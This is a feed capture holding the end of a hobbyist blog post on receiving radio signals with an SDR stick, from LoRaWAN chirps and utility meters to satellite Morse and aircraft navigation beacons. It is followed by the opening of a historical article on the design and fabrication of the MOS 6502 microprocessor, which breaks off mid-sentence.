    &lt;p&gt;Iâve been browsing the usual frequencies, and tried to decode images using the software QSSTV on Linux. And I accidentally caught a piece of what seems to be a test image!&lt;/p&gt;
    &lt;p&gt;SSTV has the prettiest noise! :3&lt;/p&gt;
    &lt;head rend="h3"&gt;37: Listen to The Buzzer&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 4625 kHz&lt;/item&gt;
      &lt;item&gt;Modulation: Upper side band&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Thereâs a mysterious Russian station broadcasting at 4625 kHz. Sometimes, it sends encrypted voice messages.&lt;/p&gt;
    &lt;p&gt;But usually, all it does is send a honking sound every two seconds, to deter other stations from using the same frequency.&lt;/p&gt;
    &lt;p&gt;The purpose of the station is unclear, but most theories think itâs military communication.&lt;/p&gt;
    &lt;head rend="h3"&gt;38: Catch a LoRaWAN chirp&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 868.1-868.5 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This was a bit like trying to catch a rare insect! ð&lt;/p&gt;
    &lt;p&gt;LoRaWAN is a low-power, wide-area networking protocol, intended for âInternet of Thingsâ applications.&lt;/p&gt;
    &lt;p&gt;You can see transmission in the lower half of the screenshot! It has a very cute structure: You can see eight âdown-chirpsâ, followed by two âup-chirpsâ. Thatâs the header, followed by the payload.&lt;/p&gt;
    &lt;p&gt;To look for the signal, I made a âbaseband captureâ in SDR++, and opened the recording in Sonic Visualizer.&lt;/p&gt;
    &lt;head rend="h3"&gt;39: Read data from utility meters&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 868.95 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Devices like smoke detectors or meters for water or heat are sending their readings via a protocol called Wireless M-Bus.&lt;/p&gt;
    &lt;p&gt;Again, I was surprised by how many devices seem to be around! Thanks for the tip, @envy :)&lt;/p&gt;
    &lt;p&gt;wmbusmeters is a really nice tool for decoding the messages.&lt;/p&gt;
    &lt;head rend="h3"&gt;40: âWatchâ TV&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 174-786 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The chips in my SDR stick are also being used in DVB-T dongles! So, can we watch TV? Unfortunately, no.&lt;/p&gt;
    &lt;p&gt;From what I pieced together, thereâs a difference between using the stick in SDR mode (where it sends the full spectrum), and in TV mode (where it sends the decoded video).&lt;/p&gt;
    &lt;p&gt;In Germany, thereâs now DVB-T2, which my hardware doesnât support in TV mode. And in SDR mode, the bandwidth is too narrow for DVB-T2. But we can scroll over a channel and look at it! :3&lt;/p&gt;
    &lt;head rend="h3"&gt;41: Track cars and buses&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 433.05-434.79 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Did a little walk to a big intersection, to see what âdevice signalsâ Iâd find there at 433 MHz.&lt;/p&gt;
    &lt;p&gt;I could confirm that the IBIS beacons are in fact being sent by buses! The included âvehicle IDâ even matches the white number thatâs printed on it.&lt;/p&gt;
    &lt;p&gt;I also saw some messages from tire pressure monitoring systems in cars! They also include an ID, and usually, the brand of the car! The owners probably arenât aware how easy it would be to track themâ¦ (Thanks, @scy!)&lt;/p&gt;
    &lt;p&gt;Side note: I wonder why some signals in that band are warped like the one at 433.96 MHz here!&lt;/p&gt;
    &lt;p&gt;At first, I thought âAh, Doppler effect again, itâs coming from a moving car!â But if thatâd be the case, that car would be moving at over 700 m/sâ¦&lt;/p&gt;
    &lt;p&gt;Friends later suspected that this effect is due to weak batteries affecting the crystal in the sending devices, or temperature changes.&lt;/p&gt;
    &lt;head rend="h3"&gt;42: Receive Morse code from a satellite!&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 145.860 (status information) and 145.960 (beacon)&lt;/item&gt;
      &lt;item&gt;Modulation: CW&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;So I caught a satellite again! :D This time, it was school project, the Italian satellite âMax Valierâ. It continuously sends Morse code on a beacon frequency.&lt;/p&gt;
    &lt;p&gt;Pretty weak signal, but hereâs what I could hear:&lt;/p&gt;
    &lt;p&gt;
      &lt;code&gt;
3MV MAX VALIER SAT ... MANFRED ES CHRISTA FUKSE 73 ... II3MV ...
&lt;/code&gt;
    &lt;/p&gt;
    &lt;p&gt;Super happy about this! I got both the name of the satellite, as well as its callsign at the end, and what seems to be some kind of greeting? I later learned that &lt;code&gt;ES&lt;/code&gt; is Morse code shorthand for âandâ, and that Manfred and Christa Fuchs were the founders of a company that helped launch the satellite!&lt;/p&gt;
    &lt;p&gt;(Thanks for the tip, @manawyrm!)&lt;/p&gt;
    &lt;head rend="h3"&gt;43: Receive emergency service pagers&lt;/head&gt;
    &lt;p&gt;This is another thing thatâs not allowed in Germany, so you shouldnât do it.&lt;/p&gt;
    &lt;p&gt;Pagers use a format called âPOCSAGâ (Post Office Code Standardisation Advisory Groupâ¦), which you should not decode using multimon-ng.&lt;/p&gt;
    &lt;p&gt;Because you would find that the content is short and cryptic anyway. It would probably be repeated by several stations all around you, to make sure the whole region is covered.&lt;/p&gt;
    &lt;p&gt;Do not read the English Wikipedia page! It contains frequencies!&lt;/p&gt;
    &lt;head rend="h2"&gt;Sunday&lt;/head&gt;
    &lt;p&gt;At this point, I was pretty tired. Focusing on this project for 6 days straight took a lot of energy, and I was always uncertain if I could actually complete all 50 things in that week! But I woke up with a fun idea:&lt;/p&gt;
    &lt;head rend="h3"&gt;44: Detect when a smartphone is turned on&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 13.56 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I was curious whether I could see the NFC transceiver in my smartphone! And yeah, especially using my random wire antenna, this works really well!&lt;/p&gt;
    &lt;p&gt;My smartphone seems to emit at the NFC frequency a couple of times per second. And when unlocking the screen, it emits five very strong beeps on that frequency! I can see those from the other side of our apartment.&lt;/p&gt;
    &lt;p&gt;Surely, these signals are the same for every device, right? ð¶&lt;/p&gt;
    &lt;p&gt;Observe the five beeps here:&lt;/p&gt;
    &lt;head rend="h3"&gt;45: Communicate wirelessly usingâ¦ a book&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 13.56 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Piko and I played around with NFC a bit more, and we found out that when getting close to an NFC tag, a smartphone emits at 13.56 MHz continuously!&lt;/p&gt;
    &lt;p&gt;So, we started sending Morse code to each other between rooms, using a smartphone and a library book! :âD&lt;/p&gt;
    &lt;p&gt;Take that, Bundesnetzagentur!&lt;/p&gt;
    &lt;p&gt;Seems that the shortest signal you can create is 0.7 s long, resulting in a meager communication speed of 3-4 words per minuteâ¦&lt;/p&gt;
    &lt;head rend="h3"&gt;46: Receive navigational aids for airplanes&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Frequency: 108.00-117.95 MHz&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;There are ground stations that emit a signal that allow calculating your angle relative to it! If you receive two, you can determine your position. (Thanks, @fly_it!)&lt;/p&gt;
    &lt;p&gt;I heard the one close to Hamburg! And SDRangel has a decoder, of course! It calculated angles between 210Â° and 230Â°, which is pretty close to the actual value of 224Â°! I donât think they are meant to be used from the ground.&lt;/p&gt;
    &lt;p&gt;The neat navigational map is from https://skyvector.com!&lt;/p&gt;
    &lt;p&gt;I spent ages trying to build my own decoder in GNU Radio. But I wasnât familiar with it at all, and I eventually gave up. Still, that seems to be the software you wanna learn for tasks like these!&lt;/p&gt;
    &lt;p&gt;By the way, how the ground stations work is fascinating: In my case, itâs a âDoppler VORâ: It transmits a static frequency via amplitude modulation, and adds another signal that moves around in circles, so you get a Doppler frequency shift.&lt;/p&gt;
    &lt;p&gt;If you compare the two, you can calculate the angle!&lt;/p&gt;
    &lt;head rend="h3"&gt;47: See how low you can go in the frequency spectrum&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Modulation: mostly AM&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This was a fun exploration: Whatâs the lowest-frequency broadcast I can receive?&lt;/p&gt;
    &lt;p&gt;The RTL-SDR Blog V4 stick Iâm using has a neat feature â a built-in âupconverterâ, which is enabled automatically when you try to listen to frequencies below what the chipset supports. This allows it to receive down to ~500 kHz!&lt;/p&gt;
    &lt;p&gt;The first stations that are comprehensible started at 1 MHz for me.&lt;/p&gt;
    &lt;head rend="h3"&gt;48: See how high you can go in the frequency spectrum&lt;/head&gt;
    &lt;p&gt;The chipset in my SDR stick go up to maximum frequency of 1766 MHz. It seems pretty quiet up there, probably because I lack proper antennas. I found these three lines in an amateur band, but they probably originate from the stick itself, or another device.&lt;/p&gt;
    &lt;p&gt;So the highest-frequency thing Iâve received is ADS-B at 1090 MHz (see entry #5)! ð&lt;/p&gt;
    &lt;head rend="h3"&gt;49: Listen to marine radio&lt;/head&gt;
    &lt;p&gt;Weâve been over this. Not allowed in Germany. Donât do it. â&lt;/p&gt;
    &lt;p&gt;But if youâre in the US, anyone can purchase a marine radio, and even use it to transmit! :D&lt;/p&gt;
    &lt;head rend="h3"&gt;50: Go mobile!&lt;/head&gt;
    &lt;p&gt;Just now, I was wondering whether there are any Android apps for controlling SDRs.&lt;/p&gt;
    &lt;p&gt;And it turned out, the software I liked best that week, SDR++, had an Android version since a couple of weeks! \o/&lt;/p&gt;
    &lt;p&gt;So now I could go track down the source of some of these strange signals! :3&lt;/p&gt;
    &lt;head rend="h2"&gt;Looking back&lt;/head&gt;
    &lt;p&gt;And with that, â¦ ð¥ â¦ I was officially done with my â50 things to do with a software defined radioâ! ð&lt;/p&gt;
    &lt;p&gt;This were seven very intense days, where I learned a lot of new things about radio waves and the many things they can be used for!&lt;/p&gt;
    &lt;p&gt;I was proud! I was tired! I was amazed that all those things I received are all around us, everywhere, all at once â if you know where to look. :O&lt;/p&gt;
    &lt;head rend="h2"&gt;More things to explore&lt;/head&gt;
    &lt;p&gt;Hereâs some things that I havenât tried or that havenât worked:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Receiving digital voice modes (SDRangel should be able to do it, but I couldnât figure it out)&lt;/item&gt;
      &lt;item&gt;Receive something from the ISS&lt;/item&gt;
      &lt;item&gt;Use the GRAVES radar to detect meteors (couldnât detect it)&lt;/item&gt;
      &lt;item&gt;Receive videos on ham bands&lt;/item&gt;
      &lt;item&gt;Receive Iridium satellites&lt;/item&gt;
      &lt;item&gt;Listen to pirate stations&lt;/item&gt;
      &lt;item&gt;Receive Cubesat&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Also, doing things with Wi-Fi/Bluetooth/Zigbee could be fun, but Iâd need a more expensive receiver for those frequencies.&lt;/p&gt;
    &lt;head rend="h2"&gt;Future thoughts&lt;/head&gt;
    &lt;p&gt;So, was this project in fact a gateway drug to getting an amateur radio license?&lt;/p&gt;
    &lt;p&gt;Yeah, probably. Iâd love to transmit something and experiment more! :D&lt;/p&gt;
    &lt;p&gt;In Germany, a new license class will be introduced in summer 2024, thatâll allow you to send on the 10-meter, 2-meter and 70-cm bands (the âN classâ).&lt;/p&gt;
    &lt;p&gt;In fact, thereâs a really good German online course that teaches you everything you need to know: 50ohm.de&lt;/p&gt;
    &lt;p&gt;Highly recommended, even if youâre not planning on getting a license.&lt;/p&gt;
    &lt;p&gt;Finally, thanks to Piko, Chris, and Cqoicebordel for proof-reading this blog post! &amp;lt;3&lt;/p&gt;
    &lt;head rend="h2"&gt;Join the discussion!&lt;/head&gt;
    &lt;p&gt;You can add your comment in the Fediverse! Alternatively, drop me a mail at mail@blinry.org. Also, you can support me on Patreon or subscribe to my newsletter&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45262835</guid><pubDate>Tue, 16 Sep 2025 14:35:19 +0000</pubDate></item><item><title>Development of the MOS Technology 6502: A Historical Perspective (2022)</title><link>https://www.EmbeddedRelated.com/showarticle/1453.php</link><description>&lt;doc fingerprint="2610db57c1a57f1a"&gt;
  &lt;main&gt;&lt;p&gt;One ubiquitous microprocessor of the late 1970s and 1980s was the MOS Technology MCS 6502. I included a section on the development of the 6502 in Part 2 of Supply Chain Games, and have posted it as an excerpt here, as I believe it is deserving in its own right.&lt;/p&gt;&lt;p&gt;(Note: MOS Technology is pronounced with the individual letters M-O-S “em oh ess”,[1] not “moss”, and should not be confused with another semiconductor company, Mostek.)&lt;/p&gt;&lt;head rend="h2"&gt;Semiconductor Fabrication and the 6502&lt;/head&gt;&lt;p&gt;The 6502 was first delivered to customers in September 1975. This was one of a few iconic microprocessors of the late 1970s and early 1980s. To understand how big of an impact this chip had, all you have to do is look at its presence in many of the 8-bit systems of the era, sold by the millions:&lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt;Apple II&lt;/item&gt;&lt;item&gt;Atari 400 and Atari 800&lt;/item&gt;&lt;item&gt;Atari VCS (6507)&lt;/item&gt;&lt;item&gt;BBC Micro&lt;/item&gt;&lt;item&gt;Commodore PET and VIC-20&lt;/item&gt;&lt;item&gt;Commodore 64 (6510)&lt;/item&gt;&lt;item&gt;Commodore 128 (8502)&lt;/item&gt;&lt;item&gt;Nintendo Entertainment System (Ricoh 2A03)&lt;/item&gt;&lt;/list&gt;&lt;p&gt;The eventual ubiquitousness of the 6502-based personal computer was the end result of a long process that began thanks to Motorola for its pricing intransigence of the 6800 processor, and to Chuck Peddle and Bill Mensch for getting frustrated with Motorola. In March 1974, Motorola had announced the 6800, but did not reach production until November 1974, initially selling the chip for \$360 per processor in small quantities. Chuck Peddle had been giving marketing seminars to large customers in early 1974 — he’d smelled opportunity and tried to convince Motorola to pursue a lower-cost version for the industrial controls market, but they weren’t interested.[1 page 24-26] By August, Peddle had hatched a plan, leaving Motorola and setting off across the country to join MOS Technology, a scrappy little integrated circuit manufacturer located near Valley Forge, Pennsylvania. Mensch, one of the 6502 designers who went to MOS with Peddle, says this: “The environment was a small company where Mort Jaffe, John Paivinen, Don McLaughlin, the three founders, had created small teams of very capable calculator chip and system designers, a quick turn around mask shop and a high yielding large chip manufacturing team out of TI. So you go from Motorola with, relatively speaking, an unlimited budget for design and manufacturing, to an underfunded design team with very limited design tools for logic and transistor simulation. We had to manually/mentally simulate/check the logic and use very limited circuit simulation. In other words, it was really low budget. The datasheets and all documentation was done by the design team.”[2][3] Peddle persuaded Mensch and six other Motorola engineers — Harry Bawcom, Ray Hirt, Terry Holdt, Michael Janes, Wil Mathys, and Rod Orgill — to join him and a few others at MOS in designing and producing what became the MCS 6501/6502 chipset. “At MOS John Paivinen, Walt Eisenhower, and Don Payne, head of the mask shop, and mask designer Sydney Anne Holt completed the design and manufacturing team that created the high yielding NMOS depletion mode load process,” says Mensch. “The result was the MCS 6501/6502, 6530/6532 Ram, ROM Timer and IO combo and 6520/6522 PIA/VIA microprocessor family.”[3]&lt;/p&gt;&lt;p&gt;Some technical details of the 6502 are slightly fuzzy after so much time has passed — but I have chosen to focus on the 6502 because it is such a well-known processor, and at least some details are available. Semiconductor manufacturers are notoriously secretive, and it is hard to find detailed descriptions of how modern ICs are designed and manufactured. Whereas there are plenty of sources of information about the 6502.&lt;/p&gt;&lt;p&gt;(A word about the numbered notes: I don’t normally use such things, preferring instead a blogorrhific style of adding hyperlinks all over the place to point towards further information on various topics. But in this article, I have used notes to cite my sources a little more formally, for a few reasons. First, because there are inaccuracies about the 6502 floating about on the Internet, I’m trying to be a bit more careful. And since I’m not an expert in semiconductor manufacturing or economics, I feel like I have to point toward some specific accounts that back up my statements. Finally, a citation is a little more robust than a hyperlink in case an online publication becomes unavailable.)&lt;/p&gt;&lt;p&gt;EDN had a nice technical writeup of the 6502 in September 1975. BYTE magazine covered the 6502 in November 1975, with more of a focus on its instruction set than the physical aspects of the chip itself. Mind you, both these articles predated the use of the 6502 in any actual computer.&lt;/p&gt;&lt;p&gt;The manufacturing process for semiconductors is like printing newspapers. Sort of. Not really. Maybe more like the process for creating printed circuit boards. Well, at any rate, newspapers and printed circuit boards and semiconductors have these aspects in common:&lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt;Production requires a big complicated manufacturing plant with many steps.&lt;/item&gt;&lt;item&gt;Photolithography techniques are used to create many copies of a master original.&lt;/item&gt;&lt;item&gt;The master original requires creating content and layout that fits in a defined area.&lt;/item&gt;&lt;/list&gt;&lt;p&gt;Except that the semiconductor industry has been expanding for decades without any sign of letting up, whereas the newspaper industry has been struggling to survive in the age of the Internet.&lt;/p&gt;&lt;p&gt;Semiconductor manufacturing occurs in a fabrication plant or “fab”. The raw, unpackaged product is called a die (plural = “dice” or “dies” or “die”), and the master original is called a photomask set or mask set. Engineers cram a bunch of tiny shapes onto the photomasks in the mask set; each of the photomasks defines a separate step in the photolithography process and is used to form the various features of individual circuit elements — usually transistors, sometimes resistors or capacitors — or the conducting paths that interconnect them, or the flat squarish regions called “bonding pads” which are used to connect to the pins of a packaged chip. Ultrapure, polished circular semiconductor wafers are used; most often these are made of silicon (Si), but sometimes they consist of other semiconductor crystals such as gallium arsenide (GaAs), gallium nitride (GaN), silicon carbide (SiC) or a hodgepodge of those elements somewhere towards the right side of the periodic table: AlGaAsPSnGeInSb. These wafers are sawn as thin slivers from a monocrystalline boule, basically a big shiny circular semiconductor salami, which is typically formed by pulling a seed crystal upwards, while rotating, from molten material, using the Czochralski process, which is very hard for us to pronounce correctly.&lt;/p&gt;&lt;p&gt;The wafers have a bunch of die arranged in an array covering most of the wafer’s surface; these are separated into the individual die, and go through a bunch of testing and packaging steps before they end up inside a package with conductive pins or balls, through which they can connect to a printed circuit board. The packaged semiconductor is an integrated circuit (IC) or “chip”. The percentage of die on a wafer that work correctly is called the device yield. Die size and yield are vital in the semiconductor industry: they both relate directly to the cost of manufacturing. If chip designers or process engineers can reduce the die area by half, then about twice as many die can be fit on a wafer for the same cost. If the yield can be raised from 50% to 100% then twice as many die can be produced for end use, for the same cost. Yield depends on numerous processing factors, and gets worse for large die ICs: each specific manufacturing process has a characteristic defect density (defects per unit area), so a larger die size raises the chance that a defect will be present on any given die and cause it to fail.&lt;/p&gt;&lt;p&gt;Think of defects as bullets that kill on contact. The figure below shows three simulated circular wafers with 40 defects in the same places, but with different die sizes. There are fewer of the larger die, and because each die presents a larger cross-sectional area which is prone to defects, the yield ends up being lower.&lt;/p&gt;&lt;p&gt;The steps of the photolithography process are performed under various harsh environmental conditions — 1000° C, high pressure or under vacuum, and sometimes with toxic gases such as silane or arsine that often react violently if exposed to the oxygen in air — and generally fall into one of the following categories:&lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt;depositing atoms of some element onto the wafer&lt;/item&gt;&lt;item&gt;coating the wafer with photoresist&lt;/item&gt;&lt;item&gt;exposing the photoresist to light in a particular pattern (here’s where the photomasks come in)&lt;/item&gt;&lt;item&gt;etching away material&lt;/item&gt;&lt;item&gt;annealing — which is a heating/cooling process to allow atoms in the wafer to “relax” and lower crystal stress&lt;/item&gt;&lt;item&gt;cleaning the wafer&lt;/item&gt;&lt;/list&gt;&lt;p&gt;And through the miracle of modern chemistry, we get a bunch of transistors and other things all connected together.&lt;/p&gt;&lt;p&gt;The term “process” in semiconductor manufacturing usually refers to the specific set of steps that are precisely controlled to form semiconductors with specific electrical characteristics and geometric tolerances. ICs are designed around a specific process with desired characteristics; the same process can be used to create many different devices. It is not a simple manner to migrate an IC design from one process to another — this is an important contributor to today’s supply chain woes.&lt;/p&gt;&lt;p&gt;Let’s look at that photomicrograph again:&lt;/p&gt;&lt;p&gt;The original 6502 manufactured in 1975 contained 3510 transistors and 1018 depletion-load pullups, in a die that was 0.168 inches × 0.183 inches (≈ 4.27mm × 4.65mm), produced on a 3” silicon wafer.[4] The process used to create the 6502 was the N-channel Silicon Gate Depletion 5 Volt Process, aka the “019” process. Developed at MOS Technology by Terry Holdt, it required seven photomasks, and consisted of approximately 50 steps to produce these layers:[5][6]&lt;/p&gt;&lt;list rend="ol"&gt;&lt;item&gt;Diffusion&lt;/item&gt;&lt;item&gt;Depletion implant&lt;/item&gt;&lt;item&gt;Buried contact (joining N+ to poly)&lt;/item&gt;&lt;item&gt;Polysilicon&lt;/item&gt;&lt;item&gt;Pre-ohmic contacts&lt;/item&gt;&lt;item&gt;Metal (aluminum)&lt;/item&gt;&lt;item&gt;Passivation (silicon dioxide coating)&lt;/item&gt;&lt;/list&gt;&lt;p&gt;You can see these layers more closely in higher-resolution photomicrographs — also called “die shots” — of the 6502. Antoine Bercovici (@Siliconinsid) and John McMaster collaborated on a project to post 6502 die shots stitched together on McMaster’s website, where you can pan and zoom around. (If you look carefully, you can find the MOS logo and the initials of mask designers Harry Bawcom and Michael Janes.) I think the most interesting area is near the part number etched into the die:&lt;/p&gt;&lt;p&gt;The large squarish features are the bonding pads, and are connected to the pins of the 6502’s lead frame with bond wires that are attached at each end by ultrasonic welding, sometimes assisted by applying heat to the welding joint. (I got a chance to use a manual bond wiring machine in the summer of 1994. It was not easy to use, and frequently required several attempts to complete a proper connection, at least when I was the operator. I don’t remember much, aside from the frustration.)&lt;/p&gt;&lt;p&gt;The little cross and rectangles are registration marks, to align the masks and check line widths. The larger squares above them are test structures, which are not connected to any external pins, but can be checked for proper functioning during wafer probing.&lt;/p&gt;&lt;p&gt;The different layers have different visual characteristics — except for the depletion layer — in these images:&lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt;the silicon substrate is an untextured gray&lt;/item&gt;&lt;item&gt;the aluminum metal has a granular quality&lt;list rend="ul"&gt;&lt;item&gt;it has a pinkish tinge when it has been covered by the passivation layer (most of the die)&lt;/item&gt;&lt;item&gt;when uncovered, as in the bonding pads and test pads, it is a more gray color&lt;/item&gt;&lt;item&gt;the small green dots represent contacts between metal and silicon&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;&lt;item&gt;diffusion regions have a glassy look with discoloration around the edge&lt;/item&gt;&lt;item&gt;polysilicon shows up as light brown, except when it crosses through a diffusion region, where it is greenish and forms a MOSFET gate — Tada! instant transistor! — controlling whether current can flow between the adjacent diffusion regions. (Ken Shirriff has some more detailed explanations with images for some features of the 6502.)&lt;/item&gt;&lt;/list&gt;&lt;p&gt;How many chips are on a wafer? It’s hard to find that information for the 6502, but Wikipedia does have a description of the Motorola 6800:&lt;/p&gt;&lt;quote&gt;&lt;p&gt;In the 1970s, semiconductors were fabricated on 3 inch (75 mm) diameter silicon wafers. Each wafer could produce 100 to 200 integrated circuit chips or dies. The technical literature would state the length and width of each chip in “mils” (0.001 inch). The current industry practice is to state the chip area. Processing wafers required multiple steps and flaws would appear at various locations on the wafer during each step. The larger the chip the more likely it would encounter a defect. The percentage of working chips, or yield, declined steeply for chips larger than 160 mils (4 mm) on a side.&lt;/p&gt;&lt;p&gt;The target size for the 6800 was 180 mils (4.6 mm) on each side but the final size was 212 mils (5.4 mm) with an area of 29.0 mm². At 180 mils, a 3-inch (76 mm) wafer will hold about 190 chips, 212 mils reduces that to 140 chips. At this size the yield may be 20% or 28 chips per wafer. The Motorola 1975 annual report highlights the new MC6800 microprocessor but has several paragraphs on the “MOS yield problems.” The yield problem was solved with a design revision started in 1975 to use depletion mode in the M6800 family devices. The 6800 die size was reduced to 160 mils (4 mm) per side with an area of 16.5 mm². This also allowed faster clock speeds, the MC68A00 would operate at 1.5 MHz and the MC68B00 at 2.0 MHz. The new parts were available in July 1976.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;The MOS Technology team seized the opportunity and beat Motorola to production with a depletion-load NMOS process (“regular” enhancement-mode N-channel MOSFETs acted as pull-down switches; depletion-mode N-channel MOSFETs were used as a load, with their gate and source tied together to act as a current source) in the 6502, which allowed the design team to achieve higher performance in a smaller die size.&lt;/p&gt;&lt;p&gt;For the most part, design of the 6502 was paper-and-pencil, with some computer-assisted aspects of layout. Peddle was project leader, and focused on the business aspects; he also worked on the instruction set architecture — basically the abstract programmer’s model of how the chip worked, including the various opcodes — with Orgill and Mathys.[7]&lt;/p&gt;&lt;p&gt;To reduce this to a working circuit design, the 6502 team had to come up with a digital design of instruction decoders, arithmetic/logic unit (ALU), registers and data paths (high-level register-centric design) that could be implemented using individual gates made out of the NMOS transistors and depletion loads (low-level circuit design). Peddle, Orgill, Mathys, and Mensch worked out the register structure and other sections of the high-level design,[1 page 28][8] with Mathys translating a sequence of data transfers for each instruction into state diagrams and logic equations.[8] Mensch and Orgill completed the translation of the register-centric design from logic equations into a circuit schematic (technically known as the “650X-C Microprocessor Logic Diagram”[9]) of the NMOS transistors and depletion loads, annotated with dimensions, while Wil Mathys worked on verifying the logic.[10]&lt;/p&gt;&lt;p&gt;Mensch describes Orgill and himself as “semiconductor engineers”, responsible for reducing logic equations to transistor-level implementation in an IC to ensure that it meets speed, size, interface compatibility, and power specifications.[11] Orgill’s specialization was on the high-level architecture, contributing to the ISA, with “a focus on logic design and minimization”,[11] whereas Mensch had a predilection for low-level details. Mensch determined the design rules, ran circuit simulations on portions of the chip — limited to around 100 components at a time with the computation facilities available to MOS Technology in 1975 — and designed in the two-phase clock generator that would become the distinguishing factor between the 6501 and the 6502.[11][12 page 19] (The 6501 and 6502 shared all masks except for the metal layer, which had two slightly different versions: the 6501 left the two-phase clock generator disconnected so that it was pin-compatible with the Motorola 6800, whereas the 6502 connected the clock generator circuitry, breaking pin-compatibility. In 1976, MOS Technology agreed to cease production of the 6501 as a condition of a legal settlement with Motorola.[13])&lt;/p&gt;&lt;p&gt;Orgill and Mensch drew the schematic on mylar, using pencils with plastic lead[14] which could be erased. I found a book that described drafting on mylar this way:[15]&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Drawing on mylar for the first time can be a scary experience — both for the novice designer and the company. The surface of mylar drafting film holds drawing lead much more loosely than the fibers in paper. If you were to draw on mylar with a regular graphite “lead” pencil, the disastrous results would be like drawing on a sheet of frosted glass with a charcoal briquette. You could form the lines, but they wouldn’t be very durable against smudges.&lt;/p&gt;&lt;p&gt;To compensate for this lack of adhesion, special plastic lead was developed specifically for use on mylar drafting film. Instead of being made from graphite, this “lead” is made of a soft waxy plastic compound. It comes in varying degrees of hardness just like regular drafting pencils. The softest designation is E0, and they progress in hardness with E1, E2, E3, etc.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;Here is one section of the schematic, showing a section of the ALU; the dashed lines each surround one bit of the ALU.[16]&lt;/p&gt;&lt;p&gt;The annotations here include two types. The letters A-Z and AA-JJ, according to Mensch, denoted individual transistors for the purposes of checking correctness in the layout.[16] The numbers indicate transistor dimensions, in mils (thousandths of an inch), and are listed in two forms:[14]&lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt;A single number denotes NMOS gate widths, with a standard gate length of 0.35, the minimum used in this design&lt;/item&gt;&lt;item&gt;A pair of numbers W/L with a dividing line denotes gate width and length — current in the transistor is proportional to W/L, which determines how small and how fast each transistor is.&lt;/item&gt;&lt;/list&gt;&lt;p&gt;The transistor at the output of a gate is a depletion-mode pull-up, with the others as enhancement-mode transistor inputs[14] — so, for example, the NOR gate with transistors AA and Y as inputs had gate widths of 0.7 mil and length of 0.35 mil, and a depletion-mode pull-up of 0.3 mil width and 0.8 mil length. (In theory, someone could double-check this against Antoine Bercovici’s die photos of the 6502 rev A, by locating individual transistors and trying to find the corresponding transistors on the logic diagram… I have not, and leave this as an exercise for the industrious reader.)&lt;/p&gt;&lt;p&gt;The minimum gate length of 0.35 mil implies a technology node of 0.35 mil ≈ 8.9 micron for the 6502.&lt;/p&gt;&lt;p&gt;There are a few other interesting things visible from the schematic — the use of dynamic logic, for example. Anytime you see clock signals (ϕ1 and ϕ2 are the two-phase clock signals on the 6502) doing weird stuff, where some logic gate doesn’t have any driving input part of the time, you know you’ve got dynamic logic going on. (Wikipedia says “Dynamic logic circuits are usually faster than static counterparts, and require less surface area, but are more difficult to design.”) What caught my eye was the “T” and “B” on these AND gate inputs shown below:&lt;/p&gt;&lt;p&gt;I asked Mensch about this; he said they stood for “top” and “bottom”, specifically referring to the implementation of an AND or NAND gate in depletion-mode NMOS.[16] Here’s a transistor-level implementation of that pair of AND gates followed by a NOR gate:&lt;/p&gt;&lt;p&gt;Transistors Q1 (top) and Q2 (bottom) would correspond to one T/B pair of AND-gate inputs, and Q3 (top) and Q4 (bottom) the other. This matters because switching speed is different for the top and bottom MOSFETs — the top ones have drain-to-gate capacitance slowing down the switching (the Miller effect), whereas the bottom ones see a low-impedance load from the top transistors, forming a cascode configuration. As to why that is critical here, I’m out of my element — Mensch says the bottom transistor should be the first transistor to change state, and the last signal to change should be the top transistor[18] — but the point here is that digital logic design is not just a nice little abstraction layer with ones and zeros based on simple, identical, combinational logic and flip-flops. A lot of work went into choosing transistor sizes to get the 6502 to work fast under die size constraints.&lt;/p&gt;&lt;p&gt;The schematic also served as a rough layout known as a floorplan showing high-level placement, with the various gates arranged on the schematic roughly where Mensch thought they should go on the chip.[19] Bawcom, Holt, and Janes were mask designers for the 6502 chipset, taking the circuit design and placement and implementing them as individual transistors or resistors, made out of rectangular features sketched on various layers of Stabilene mylar film.&lt;/p&gt;&lt;p&gt;The mask designers did not draw these features directly by hand — when I first started reading historical accounts of the 6502 for this article, I had a mental image of them sketching transistors on Stabilene one by one, fitting together like a puzzle until the last pieces were drawn in… and dammit, there’s only enough room for seven flip-flops, not eight, so they’d have to start over and try again. But that’s not how it worked. Instead, the design was based on “cells”, small reusable pieces of the design that could be planned separately and then fit into place in the layout, like Escher tesselations all coming together, or some kind of sadistic furniture floor 